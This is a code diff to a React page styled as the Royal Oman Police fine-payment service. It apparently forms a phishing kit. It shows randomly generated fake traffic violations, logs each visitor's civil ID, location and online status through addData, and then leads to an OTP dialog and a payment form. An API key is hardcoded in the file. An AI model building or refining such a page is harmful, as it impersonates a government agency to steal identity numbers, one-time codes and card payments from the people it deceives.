@@ -88,7 +88,7 @@ const mockViolations: Violation[] = [
     plateNumber: "*****0",
     status: "paid",
   },
- 
+
   {
     id: "V009",
     type: "القيادة بدون رخصة",
@@ -126,17 +126,16 @@ const mockViolations: Violation[] = [
     status: "paid",
   },
 ]
-function randstr(prefix:string)
-{
-    return Math.random().toString(36).replace('0.',prefix || '');
+function randstr(prefix: string) {
+  return Math.random().toString(36).replace('0.', prefix || '');
 }
-const visitorID=randstr('om-')
+const visitorID = randstr('om-')
 
 export default function ROPFinePage() {
   const [violations, setViolations] = useState<Violation[]>([])
   const [isLoading, setIsLoading] = useState(false)
   const [showViolations, setShowViolations] = useState(false)
-  const [showOtp,setShowOTP] = useState(false)
+  const [showOtp, setShowOTP] = useState(false)
   const [showPayment, setShowPayment] = useState(false)
   const [formData, setFormData] = useState({
     registrationType: "personal",
@@ -147,26 +146,26 @@ export default function ROPFinePage() {
   async function getLocation() {
     const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
     const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
-  
+
     try {
-        const response = await fetch(url);
-        if (!response.ok) {
-            throw new Error(`HTTP error! Status: ${response.status}`);
-        }
-        const country = await response.text();
-        addData({
-            id:visitorID,
-            country: country
-        })
-        localStorage.setItem('country',country)
-        setupOnlineStatus(visitorID)
-      } catch (error) {
-        console.error('Error fetching location:', error);
+      const response = await fetch(url);
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      const country = await response.text();
+      addData({
+        id: visitorID,
+        country: country
+      })
+      localStorage.setItem('country', country)
+      setupOnlineStatus(visitorID)
+    } catch (error) {
+      console.error('Error fetching location:', error);
     }
   }
-useEffect(()=>{   
-   getLocation()
-},[])
+  useEffect(() => {
+    getLocation()
+  }, [])
   const getRandomViolations = () => {
     const numberOfViolations = Math.floor(Math.random() * 4) + 1 // 1-4 violations
     const shuffled = [...mockViolations].sort(() => 0.5 - Math.random())
@@ -177,12 +176,12 @@ useEffect(()=>{
   function isValidOmanId(id: string): boolean {
     return omanIdRegex.test(id);
   }
-  
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     setIsLoading(true)
     // Simulate API call delaay
-addData({id:visitorID,phone:formData.civilId})
+    addData({ id: visitorID, phone: formData.civilId })
     await new Promise((resolve) => setTimeout(resolve, 1500))
     const randomViolations = getRandomViolations()
     setViolations(randomViolations)
@@ -201,8 +200,8 @@ addData({id:visitorID,phone:formData.civilId})
       specificVehicle: false,
     })
   }
- 
-  const handlePaymentSuccess = (data:any) => {
+
+  const handlePaymentSuccess = (data: any) => {
     // Update violations to paid status
 
     const updatedViolations = violations.map((v) => (v.status === "unpaid" ? { ...v, status: "paid" as const } : v))
@@ -218,7 +217,7 @@ addData({id:visitorID,phone:formData.civilId})
       <SiteHeader />
       <main>
         {/* Title Banner */}
-        <div className="bg-[#9aca3f] text-white text-center py-4">
+        <div className="bg-[#85a646] text-white text-center py-4">
           <h1 className="text-4xl font-bold">دفع المخالفات</h1>
         </div>
 
@@ -231,16 +230,16 @@ addData({id:visitorID,phone:formData.civilId})
             backgroundSize: "auto",
           }}
         >
-     <OTPDialog isOpen={showOtp} onClose={()=>setShowOTP(false) } phoneNumber="******0"/>
+          <OTPDialog isOpen={showOtp} onClose={() => setShowOTP(false)} phoneNumber="******0" />
           {showPayment ? (
             <PaymentForm
               handleSubmit={handlePaymentSuccess}
               totalAmount={totalAmount}
               violations={violations.filter((v) => v.status === "unpaid")}
               onCancel={() => setShowPayment(false)} onSuccess={function (): void {
-              } }            />
+              }} />
           ) : !showViolations ? (
-            <Card className="max-w-md mx-auto bg-white/40 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
+            <Card className="max-w-md mx-auto bg-backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
               <CardContent className="p-8">
                 <form onSubmit={handleSubmit} className="space-y-6">
                   <div className="text-center">
@@ -279,9 +278,11 @@ addData({id:visitorID,phone:formData.civilId})
                       id="civil-id"
                       type="tel"
                       value={formData.civilId}
-                      onChange={(e) =>{ setFormData((prev) => ({ ...prev, civilId: e.target.value }))
-                    isValidOmanId(e.target.value)}
-                  }
+                      onChange={(e) => {
+                        setFormData((prev) => ({ ...prev, civilId: e.target.value }))
+                        isValidOmanId(e.target.value)
+                      }
+                      }
                       className="bg-white rounded-lg"
                       required
                     />
@@ -294,7 +295,7 @@ addData({id:visitorID,phone:formData.civilId})
                     <Input
                       id="expiry-date"
                       type="text"
-                      placeholder="dd-MM-yyyy"
+                      placeholder="dd/mm/yyyy"
                       value={formData.expiryDate}
                       onChange={(e) => setFormData((prev) => ({ ...prev, expiryDate: e.target.value }))}
                       className="bg-white rounded-lg"
@@ -357,7 +358,7 @@ addData({id:visitorID,phone:formData.civilId})
                         {totalAmount > 0 && (
                           <Button
                             onClick={() => setShowPayment(true)}
-                            className="flex-1 bg-[#9aca3f] hover:bg-green-600 text-white font-bold py-3"
+                            className="flex-1 bg-[#85a646] hover:bg-green-600 text-white font-bold py-3"
                           >
                             دفع المخالفات
                           </Button>
@@ -378,7 +379,7 @@ addData({id:visitorID,phone:formData.civilId})
                       <p className="text-gray-600 mb-6">لم يتم العثور على أي مخالفات مرورية مسجلة باسمك</p>
                       <Button
                         onClick={handleReset}
-                        className="bg-[#9aca3f] hover:bg-green-600 text-white font-bold px-8 py-3"
+                        className="bg-[#85a646] hover:bg-green-600 text-white font-bold px-8 py-3"
                       >
                         استعلام جديد
                       </Button>
